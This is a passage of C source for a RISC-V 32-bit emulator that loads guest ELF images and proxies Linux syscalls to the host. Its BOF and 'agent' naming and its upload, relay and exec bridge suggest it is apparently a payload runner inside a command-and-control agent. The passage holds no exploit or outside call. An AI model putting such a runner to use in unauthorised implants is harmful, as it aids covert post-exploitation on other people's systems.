    const void *addr = rv_gptr(a4, a5);
    if (buf == NULL || (a5 > 0 && addr == NULL))
      return -22;
    ssize_t n = sendto(fd, buf, a2, (int)a3, (const struct sockaddr *)addr, a5);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_RECVFROM: {
    /* The kernel cannot write the address length back through a guest address,
     * so the length word is copied in and out of the local variable. A null
     * address, as musl's recv() passes, has no length word either. */
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    struct sockaddr *addr = NULL;
    void *alenp = NULL;
    socklen_t alen = 0;
    void *buf = rv_gptr(a1, a2);
    if (buf == NULL)
      return -22;
    if (a4 != 0) {
      alenp = rv_gptr(a5, sizeof(alen));
      if (alenp == NULL)
        return -22;
      rv_memcpy(&alen, alenp, sizeof(alen));
      addr = (struct sockaddr *)rv_gptr(a4, alen);
      if (addr == NULL)
        return -22;
    }
    ssize_t n =
        recvfrom(fd, buf, a2, (int)a3, addr, alenp != NULL ? &alen : NULL);
    if (n >= 0 && alenp != NULL)
      rv_memcpy(alenp, &alen, sizeof(alen));
    return n < 0 ? -errno : n;
  }
  case RV_SYS_SETSOCKOPT: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    const void *opt = rv_gptr(a3, a4);
    if (opt == NULL && a4 != 0)
      return -22;
    return setsockopt(fd, (int)a1, (int)a2, opt, a4) < 0 ? -errno : 0;
  }
  case RV_SYS_GETSOCKOPT: {
    /* The kernel writes the length back through a guest address, so the length
     * word is copied in and out of the local variable. */
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    socklen_t optlen = 0;
    void *optlenp = rv_gptr(a4, sizeof(optlen));
    if (optlenp == NULL)
      return -22;
    rv_memcpy(&optlen, optlenp, sizeof(optlen));
    if (optlen > 512)
      return -22;
    void *optval = rv_gptr(a3, optlen);
    if (optval == NULL && optlen != 0)
      return -22;
    if (getsockopt(fd, (int)a1, (int)a2, optval, &optlen) < 0)
      return -errno;
    rv_memcpy(optlenp, &optlen, sizeof(optlen));
    return 0;
  }
  case RV_SYS_PPOLL:
  case RV_SYS_PPOLL_TIME64:
    return rv_guest_ppoll(a0, a1, a2, a3, nr == RV_SYS_PPOLL_TIME64);
  case RV_SYS_RECVMSG: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    uint8_t *g = rv_gptr(a1, 28);
    if (g == NULL)
      return -22;
    uint32_t gname = rv_le32(g + 0);
    uint32_t namelen = rv_le32(g + 4);
    uint32_t giov = rv_le32(g + 8);
    uint32_t iovcnt = rv_le32(g + 12);
    uint32_t gctl = rv_le32(g + 16);
    uint32_t ctllen = rv_le32(g + 20);
    if (iovcnt > 16)
      return -22;
    uint8_t *giovp = rv_gptr(giov, iovcnt * 8u);
    if (giovp == NULL && iovcnt != 0)
      return -22;
    struct iovec iov[16];
    for (uint32_t i = 0; i < iovcnt; i++) {
      uint32_t base = rv_le32(giovp + i * 8u);
      uint32_t len = rv_le32(giovp + i * 8u + 4);
      void *p = rv_gptr(base, len);
      if (p == NULL)
        return -22;
      iov[i].iov_base = p;
      iov[i].iov_len = len;
    }
    struct msghdr msg;
    rv_memzero(&msg, sizeof(msg));
    msg.msg_name = rv_gptr(gname, namelen);
    msg.msg_namelen = namelen;
    msg.msg_iov = iov;
    msg.msg_iovlen = iovcnt;
    msg.msg_control = rv_gptr(gctl, ctllen);
    msg.msg_controllen = ctllen;
    ssize_t n = recvmsg(fd, &msg, (int)a2);
    if (n < 0)
      return -errno;
    rv_wr32((uint32_t)(g - rv_ram) + 4, (uint32_t)msg.msg_namelen);
    rv_wr32((uint32_t)(g - rv_ram) + 20, (uint32_t)msg.msg_controllen);
    rv_wr32((uint32_t)(g - rv_ram) + 24, (uint32_t)msg.msg_flags);
    return n;
  }
  case RV_SYS_LSEEK: {
    /* riscv32 passes a 64-bit off_t in the a1/a2 register pair. */
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    off_t off = (off_t)(((uint64_t)a2 << 32) | a1);
    off_t r = lseek(fd, off, (int)a3);
    return r < 0 ? -errno : r;
  }
  case RV_SYS_SCHED_GETAFFINITY:
    return sched_getaffinity((pid_t)a0, (size_t)a1,
                             (cpu_set_t *)rv_gptr(a2, a1)) < 0
               ? -errno
               : 0;
  case RV_SYS_GETDENTS64: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    void *dst = rv_gptr(a1, a2);
    if (dst == NULL)
      return -22;
    long n = syscall(SYS_getdents64, fd, dst, (size_t)a2);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_STATX: {
    char path[1024];
    int dfd = rv_guest_dirfd(a0);
    if (dfd == -1)
      return -9;
    void *dst = rv_gptr(a4, 256);
    if (dst == NULL)
      return -22;
    if (rv_guest_path(a1, path, sizeof(path)) != 0)
      return -22;
    long n = syscall(SYS_statx, dfd, path, (int)a2, (unsigned int)a3, dst);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_PRLIMIT64:
    return 0;
  case RV_SYS_CLOCK_GETTIME64: {
    /* struct __kernel_timespec is two 64-bit fields; write them by hand so the
     * gate does not depend on the host's time_t width. */
    if (rv_gptr(a1, 16) == NULL)
      return -22;
    struct timespec ts;
    if (clock_gettime((clockid_t)a0, &ts) != 0)
      return -errno;
    uint64_t sec = (uint64_t)ts.tv_sec;
    uint64_t nsec = (uint64_t)ts.tv_nsec;
    rv_wr32(a1 - RV_RAM_BASE, (uint32_t)sec);
    rv_wr32(a1 - RV_RAM_BASE + 4, (uint32_t)(sec >> 32));
    rv_wr32(a1 - RV_RAM_BASE + 8, (uint32_t)nsec);
    rv_wr32(a1 - RV_RAM_BASE + 12, (uint32_t)(nsec >> 32));
    return 0;
  }
  case RV_SYS_GETRANDOM: {
    void *dst = rv_gptr(a0, a1);
    if (dst == NULL)
      return -22;
    long n = syscall(SYS_getrandom, dst, (size_t)a1, 0);
    if (n >= 0)
      return n;
    uint32_t x = (uint32_t)getpid() ^ a0 ^ 0x9e3779b9u;
    for (uint32_t i = 0; i < a1; i++) {
      x ^= x << 13;
      x ^= x >> 17;
      x ^= x << 5;
      ((uint8_t *)dst)[i] = (uint8_t)x;
    }
    return (int64_t)a1;
  }
  case RV_SYS_GETCWD: {
    char *dst = (char *)rv_gptr(a0, a1);
    if (dst == NULL)
      return -22;
    return getcwd(dst, a1) == NULL ? -errno : (int64_t)a1;
  }
  case RV_SYS_OPENAT: {
    char path[1024];
    int dfd = rv_guest_dirfd(a0);
    if (dfd == -1)
      return -9;
    if (rv_guest_path(a1, path, sizeof(path)) != 0)
      return -22;
    int host_fd = openat(dfd, path, (int)a2, (mode_t)a3);
    if (host_fd < 0)
      return -errno;
    int guest_fd = rv_guest_fd_alloc(host_fd);
    if (guest_fd < 0) {
      close(host_fd);
      return -24; /* EMFILE */
    }
    return guest_fd;
  }
  case RV_SYS_CLOSE: {
    int host_fd = rv_guest_fd_take((int)a0);
    if (host_fd < 0)
      return -9;
    return close(host_fd) < 0 ? -errno : 0;
  }
  case RV_SYS_READ: {
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    void *dst = rv_gptr(a1, a2);
    if (dst == NULL)
      return -22;
    ssize_t n = read(fd, dst, a2);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_WRITE: {
    const void *src = rv_gptr(a1, a2);
    if (src == NULL)
      return -22;
    if (a0 == 1 || a0 == 2) {
      if (rv_out_append(src, a2) != 0)
        return -28;
      return (int64_t)a2;
    }
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    ssize_t n = write(fd, src, a2);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_READV: {
    if (a2 > 64)
      return -22;
    int fd = rv_guest_fd_host_of((int)a0);
    if (fd < 0)
      return -9;
    const uint8_t *iov = rv_gptr(a1, a2 * 8u);
    if (iov == NULL && a2 != 0)
      return -22;
    int64_t total = 0;
    for (uint32_t i = 0; i < a2; i++) {
      uint32_t base = rv_le32(iov + i * 8u);
      uint32_t n = rv_le32(iov + i * 8u + 4);
      void *dst = rv_gptr(base, n);
      if (dst == NULL)
        return -22;
      ssize_t got = read(fd, dst, n);
      if (got < 0)
        return total > 0 ? total : -errno;
      total += got;
      if ((uint32_t)got < n)
        break;
    }
    return total;
  }
  case RV_SYS_WRITEV: {
    if (a2 > 64)
      return -22;
    const uint8_t *iov = rv_gptr(a1, a2 * 8u);
    if (iov == NULL && a2 != 0)
      return -22;
    int64_t total = 0;
    for (uint32_t i = 0; i < a2; i++) {
      uint32_t base = rv_le32(iov + i * 8u);
      uint32_t n = rv_le32(iov + i * 8u + 4);
      const void *src = rv_gptr(base, n);
      if (src == NULL)
        return -22;
      if (a0 == 1 || a0 == 2) {
        if (rv_out_append(src, n) != 0)
          return -28;
      } else {
        int fd = rv_guest_fd_host_of((int)a0);
        if (fd < 0)
          return -9;
        if (write(fd, src, n) < 0)
          return -errno;
      }
      total += n;
    }
    return total;
  }
  case RV_SYS_READLINKAT: {
    char path[1024];
    int dfd = rv_guest_dirfd(a0);
    if (dfd == -1)
      return -9;
    void *dst = rv_gptr(a2, a3);
    if (dst == NULL || rv_guest_path(a1, path, sizeof(path)) != 0)
      return -22;
    ssize_t n = readlinkat(dfd, path, (char *)dst, a3);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_FCHMODAT: {
    char path[1024];
    int dfd = rv_guest_dirfd(a0);
    if (dfd == -1)
      return -9;
    if (rv_guest_path(a1, path, sizeof(path)) != 0)
      return -22;
    return fchmodat(dfd, path, (mode_t)a2, 0) < 0 ? -errno : 0;
  }
  case RV_SYS_GETGROUPS: {
    if (a0 > 65536u)
      return -22;
    gid_t *dst = (gid_t *)rv_gptr(a1, a0 * (uint32_t)sizeof(gid_t));
    if (dst == NULL && a0 != 0)
      return -22;
    int n = getgroups((int)a0, dst);
    return n < 0 ? -errno : n;
  }
  case RV_SYS_UNAME: {
    struct utsname *u = (struct utsname *)rv_gptr(a0, sizeof(*u));
    if (u == NULL)
      return -22;
    return uname(u) < 0 ? -errno : 0;
  }
  case RV_SYS_GETPID:
    return getpid();
  case RV_SYS_GETPPID:
    return getppid();
  case RV_SYS_GETUID:
    return getuid();
  case RV_SYS_GETEUID:
    return geteuid();
  case RV_SYS_GETGID:
    return getgid();
  case RV_SYS_GETEGID:
    return getegid();
  case RV_SYS_XFER_READ: {
    char path[1024];
    if (rv_guest_path(a0, path, sizeof(path)) != 0)
      return -22;
    return rv_host_read_into_guest(path, a1, a2);
  }
  case RV_SYS_XFER_WRITE: {
    char path[1024];
    if (rv_guest_path(a0, path, sizeof(path)) != 0)
      return -22;
    return rv_host_write_from_guest(path, a1, a2);
  }
  case RV_SYS_XFER_UPLOAD:
    return rv_host_upload_from_guest(a0, a1, a2);
  case RV_SYS_XFER_SHA256:
    return rv_host_sha256_to_guest(a0, a1, a2, a3);
  case RV_SYS_XFER_RELAY: {
    /* RelaySocket takes ownership of the descriptor: remove it from the guest
     * table before the call so the guest can never touch it again. */
    int host_fd = rv_guest_fd_take((int)a1);
    if (host_fd < 0)
      return -9;
    return rv_host_relay_from_guest(a0, host_fd, a2);
  }
  case RV_SYS_XFER_EXEC:
    return rv_host_exec_to_guest(a0, (int32_t)a1, a2, a3);
  default:
    return -38;
  }
}

/* Guest ECALL: a7 is the Linux syscall number. */
static void rv_host_postexec(struct MiniRV32IMAState *state, uint32_t *pc,
                             uint32_t ir, uint32_t *trap) {
  (void)ir;
  if (*trap != 12)
    return; /* M-mode ECALL is trap 12 here; everything else is a real trap. */
  int64_t result = rv_guest_syscall(
      state->regs[17], state->regs[10], state->regs[11], state->regs[12],
      state->regs[13], state->regs[14], state->regs[15]);
  state->regs[10] = (uint32_t)result;
  state->regs[11] = (uint32_t)(result >> 32);
  *trap = 0;
  *pc += 4;
}

/* ---- ELF helpers --------------------------------------------------------- */

static uint16_t rv_le16(const uint8_t *p) {
  return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t rv_le32(const uint8_t *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
         ((uint32_t)p[3] << 24);
}

static int rv_range_ok(size_t off, size_t len, size_t total) {
  return off <= total && len <= total - off;
}

static const char *rv_trap_name(uint32_t cause) {
  switch (cause) {
  case 0:
    return "instruction address misaligned";
  case 1:
    return "instruction access fault";
  case 2:
    return "illegal instruction";
  case 3:
    return "breakpoint";
  case 5:
    return "load access fault";
  case 7:
    return "store access fault";
  case 8:
    return "environment call from U-mode";
  case 11:
    return "environment call from M-mode";
  default:
    return "guest trap";
  }
}

static int rv_run_state(struct MiniRV32IMAState *state) {
  uint32_t remaining = rv_insn_budget;
  /* A step returns early when the guest traps (an ecall, for example), but the
   * chunk it was given is charged in full. That over-counts slightly, which
   * keeps the guard conservative, and guarantees a guest that never retires
   * an instruction still cannot loop here forever. */
  while (remaining > 0 && !rv_stopped && rv_err[0] == '\0') {
    uint32_t n = remaining < RV_CHUNK ? remaining : RV_CHUNK;
    (void)MiniRV32IMAStep(state, rv_ram, 0, 0, (int)n);
    remaining -= n;

    if (rv_bad_bus) {
      rv_set_err("guest memory access out of range");
      return -1;
    }
    if (state->pc == RV_TRAP_PC) {
      rv_set_err_hex(rv_trap_name(state->mcause), state->mepc);
      return -1;
    }
  }
  if (rv_err[0] != '\0')
    return -1;
  if (remaining == 0 && !rv_stopped) {
    rv_set_err("instruction budget exceeded");
    return -1;
  }
  return 0;
}

static void rv_reset(void) {
  free(rv_out);
  rv_out = NULL;
  rv_out_len = 0;
  rv_out_cap = 0;
  rv_err[0] = '\0';
  rv_guest_status = 0;
  rv_stopped = 0;
  rv_bad_bus = 0;
  rv_insn_budget = RV_MAX_INSNS;
  rv_brk_min = 0;
  rv_heap_cur = 0;
  rv_memzero(rv_map_used, sizeof(rv_map_used));
  rv_guest_fds_reset();
}

/* The guest entry shim reserves a section for the argument handoff. Return
 * its guest address so the interpreter can fill it in; zero means the image
 * carries no shim and runs without arguments. */
static uint32_t rv_exec_hdr(const uint8_t *img, size_t len) {
  static const char hdr_name[] = ".rvhdr";
  if (len < RV_ELF32_EHDR)
    return 0;
  uint32_t shoff = rv_le32(img + 32);
  uint16_t shent = rv_le16(img + 46);
  uint16_t shnum = rv_le16(img + 48);
  uint16_t shstrndx = rv_le16(img + 50);
  if (shent < RV_ELF32_SHDR || shnum == 0 || shstrndx >= shnum ||
      !rv_range_ok(shoff, (size_t)shnum * shent, len))
    return 0;
  const uint8_t *strsh = img + shoff + (size_t)shstrndx * shent;
  uint32_t soff = rv_le32(strsh + 16);
  uint32_t ssize = rv_le32(strsh + 20);
  if (!rv_range_ok(soff, ssize, len))
    return 0;
  for (uint16_t i = 0; i < shnum; i++) {
    const uint8_t *sh = img + shoff + (size_t)i * shent;
    uint32_t name = rv_le32(sh);
    uint32_t addr = rv_le32(sh + 12);
    uint32_t size = rv_le32(sh + 20);
    if (name == 0 || name >= ssize || size < 12)
      continue;
    const char *sname = (const char *)(img + soff + name);
    if (!rv_name_eq(sname, rv_name_len(sname, ssize - name), hdr_name,
                    sizeof(hdr_name) - 1))
      continue;
    return rv_gptr(addr, 12) != NULL ? addr : 0;
  }
  return 0;
}

static int rv_elf_exec_ok(const uint8_t *img, size_t len) {
  if (len < RV_ELF32_EHDR) {
    rv_set_err("image too small");
    return 0;
  }
  if (img[0] != 0x7f || img[1] != 'E' || img[2] != 'L' || img[3] != 'F') {
    rv_set_err("not an ELF image");
    return 0;
  }
  if (img[4] != RV_ELFCLASS32 || img[5] != RV_ELFDATA2LSB ||
      img[6] != RV_EV_CURRENT) {
    rv_set_err("not a little-endian ELF32 image");
    return 0;
  }
  if (rv_le16(img + 16) != RV_ET_EXEC) {
    rv_set_err("not an executable image");
    return 0;
  }
  if (rv_le16(img + 18) != RV_EM_RISCV) {
    rv_set_err("unsupported guest image");
    return 0;
  }
  return 1;
}

static int rv_run_exec(const uint8_t *image, size_t len,
                       const struct rv_bof_args *args) {
  if (!rv_elf_exec_ok(image, len))
    return -1;
  static struct MiniRV32IMAState state;
  uint32_t entry = rv_le32(image + 24);
  uint32_t phoff = rv_le32(image + 28);
  uint16_t phent = rv_le16(image + 42);
  uint16_t phnum = rv_le16(image + 44);
  uint32_t phdr_addr = RV_PHDR_BASE;
  uint32_t arg_addr = 0;
  uint32_t base = RV_EXEC_STACK_TOP;

  if (phent < RV_ELF32_PHDR || phnum == 0) {
    rv_set_err("bad program headers");
    return -1;
  }
  if (entry < RV_RAM_BASE || entry >= RV_RAM_END) {
    rv_set_err("bad executable entry point");
    return -1;
  }
  if (!rv_range_ok(phoff, (size_t)phnum * phent, len) ||
      !rv_range_ok(phdr_addr - RV_RAM_BASE, (size_t)phnum * phent,
                   RV_RAM_SIZE)) {
    rv_set_err("bad program headers");
    return -1;
  }
  rv_memcpy(rv_ram + (phdr_addr - RV_RAM_BASE), image + phoff,
            (size_t)phnum * phent);
  uint32_t image_end = 0;

  for (uint16_t i = 0; i < phnum; i++) {
    const uint8_t *ph = image + phoff + (size_t)i * phent;
    if (rv_le32(ph) != RV_PT_LOAD)
      continue;
    uint32_t off = rv_le32(ph + 4);
    uint32_t vaddr = rv_le32(ph + 8);
    uint32_t filesz = rv_le32(ph + 16);
    uint32_t memsz = rv_le32(ph + 20);
    if (vaddr < RV_RAM_BASE || vaddr >= RV_EXEC_IMAGE_END || filesz > memsz ||
        memsz > RV_EXEC_IMAGE_END - vaddr || !rv_range_ok(off, filesz, len)) {
      rv_set_err("bad executable segment");
      return -1;
    }
    uint8_t *dst = rv_ram + (vaddr - RV_RAM_BASE);
    rv_memzero(dst, memsz);
    rv_memcpy(dst, image + off, filesz);
    if (vaddr + memsz > image_end)
      image_end = vaddr + memsz;
  }
  rv_brk_min = (image_end + 4095u) & ~4095u;
  if (rv_brk_min > RV_MAP_BASE) {
    rv_set_err("image does not fit in guest RAM");
    return -1;
  }
  rv_heap_cur = rv_brk_min;

  if (args != NULL && args->len > 0) {
    if (args->buf == NULL || args->len > RV_BOF_ARGS_MAX) {
      rv_set_err("bad argument block");
      return -1;
    }
    uint32_t arg_len = (uint32_t)args->len;
    arg_addr = RV_EXEC_ARGS_TOP - ((arg_len + 15u) & ~15u);
    if (arg_addr < RV_EXEC_ARGS_BASE) {
      rv_set_err("bad argument block");
      return -1;
    }
    rv_memcpy(rv_ram + (arg_addr - RV_RAM_BASE), args->buf, arg_len);
  }

  uint32_t hdr = rv_exec_hdr(image, len);
  if (hdr != 0) {
    rv_wr32(hdr - RV_RAM_BASE, arg_addr);
    rv_wr32(hdr - RV_RAM_BASE + 4, args != NULL ? (uint32_t)args->len : 0);
  }

  /* Initial stack: argc, argv, envp, auxv. The guest environment is the
   * agent's environment, like a native BOF sees through getEnviron(). */
  const char execfn[] = "/bin/sh";
  const uint8_t *env_block = args != NULL ? args->env : NULL;
  size_t env_block_len = args != NULL ? args->env_len : 0;
  uint32_t envc = 0;
  if (env_block != NULL) {
    size_t off = 0;
    while (off < env_block_len && envc < 4096u) {
      size_t elen = 0;
      while (off + elen < env_block_len && env_block[off + elen] != '\0')
        elen++;
      if (elen == 0)
        break;
      if (elen >= (1u << 20)) {
        rv_set_err("environment too large");
        return -1;
      }
      envc++;
      off += elen + 1;
    }
  }
  /* 1 argc + 2 argv + (envc + 1) envp + 13 aux pairs. */
  uint64_t ptr_words = 1u + 2u + (uint64_t)envc + 1u + 26u;
  if (ptr_words > UINT32_MAX / 4u) {
    rv_set_err("environment too large");
    return -1;
  }
  uint32_t str = base + (uint32_t)((ptr_words * 4u + 15u) & ~15u);
  if (str < base || str + sizeof(execfn) > RV_EXEC_ARGS_BASE) {
    rv_set_err("environment too large");
    return -1;
  }
  uint32_t envp = base + 12u;
  uint32_t p = str;
  rv_memcpy(rv_ram + (p - RV_RAM_BASE), execfn, sizeof(execfn));
  p += sizeof(execfn);
  uint32_t written = 0;
  size_t env_off = 0;
  for (; written < envc; written++) {
    size_t elen = 0;
    while (env_off + elen < env_block_len && env_block[env_off + elen] != '\0')
      elen++;
    if (elen == 0 || elen + 1u > RV_EXEC_ARGS_BASE - p)
      break;
    rv_memcpy(rv_ram + (p - RV_RAM_BASE), env_block + env_off, elen + 1u);
    rv_wr32(envp - RV_RAM_BASE + written * 4u, p);
    p += (uint32_t)(elen + 1u);
    env_off += elen + 1u;
  }
  if (p > RV_EXEC_ARGS_BASE - 16u) {
    rv_set_err("environment too large");
    return -1;
  }
  uint32_t rnd = p;
  for (uint32_t i = 0; i < 16; i++)
    rv_ram[rnd - RV_RAM_BASE + i] = (uint8_t)(0xa5u ^ (i * 37u));
  uint32_t aux = envp + (written + 1u) * 4u;

  rv_wr32(base - RV_RAM_BASE + 0, 1);            /* argc */
  rv_wr32(base - RV_RAM_BASE + 4, str);          /* argv[0] */
  rv_wr32(base - RV_RAM_BASE + 8, 0);            /* argv terminator */
  rv_wr32(envp - RV_RAM_BASE + written * 4u, 0); /* envp terminator */
  if (hdr != 0)
    rv_wr32(hdr - RV_RAM_BASE + 8, envp); /* getEnviron fallback */
#define RV_AUX(k, v)                                                           \
  do {                                                                         \
    rv_wr32(aux - RV_RAM_BASE, (k));                                           \
    rv_wr32(aux - RV_RAM_BASE + 4, (v));                                       \
    aux += 8;                                                                  \
  } while (0)
  RV_AUX(3, phdr_addr);  /* AT_PHDR */
  RV_AUX(4, phent);      /* AT_PHENT */
  RV_AUX(5, phnum);      /* AT_PHNUM */
  RV_AUX(6, 4096);       /* AT_PAGESZ */
  RV_AUX(7, 0);          /* AT_BASE */
  RV_AUX(9, entry);      /* AT_ENTRY */
  RV_AUX(11, getuid());  /* AT_UID */
  RV_AUX(12, geteuid()); /* AT_EUID */
  RV_AUX(13, getgid());  /* AT_GID */
  RV_AUX(14, getegid()); /* AT_EGID */
  RV_AUX(25, rnd);       /* AT_RANDOM */
  RV_AUX(31, str);       /* AT_EXECFN */
  RV_AUX(0, 0);          /* AT_NULL */
#undef RV_AUX

  rv_memzero(&state, sizeof(state));
  state.pc = entry;
  state.regs[2] = base;
  state.regs[10] = 1;
  state.mtvec = RV_TRAP_PC;
  state.extraflags = 3;
  return rv_run_state(&state);
}

RV_EXPORT char *Run(const uint8_t *image, size_t len,
                    const struct rv_bof_args *args) {
  if (rv_ram_map() != 0)
    return NULL;
  rv_reset();

  if (image == NULL || len == 0) {
    rv_set_err("empty image");
    rv_ram_unmap();
    return NULL;
  }
  if (rv_run_exec(image, len, args) != 0) {
    rv_guest_fds_reset();
    rv_ram_unmap();
    return NULL;
  }
  if (rv_out == NULL) {
    rv_out = (char *)malloc(1);
    if (rv_out == NULL) {
      rv_set_err("out of memory");
      rv_ram_unmap();
      return NULL;
    }
    rv_out[0] = '\0';
    rv_out_cap = 1;
  }
  rv_guest_fds_reset();
  rv_ram_unmap();
  return rv_out;
}

RV_EXPORT const char *LastError(void) { return rv_err; }

RV_EXPORT int ExitCode(void) { return rv_guest_status; }

RV_EXPORT void SetHostBridge(void *ctx, rv_host_read_fn read,
                             rv_host_write_fn write, rv_host_upload_fn upload,
                             rv_host_sha256_fn sha256, rv_host_relay_fn relay,
                             rv_host_exec_fn exec) {
  rv_host_ctx = ctx;
  rv_host_read = read;
  rv_host_write = write;
  rv_host_upload = upload;
  rv_host_sha256 = sha256;
  rv_host_relay = relay;
  rv_host_exec = exec;
}

RV_EXPORT void Free(char *out) {
  if (out == NULL || out != rv_out)
    return;
  free(rv_out);
  rv_out = NULL;
  rv_out_len = 0;
  rv_out_cap = 0;
}
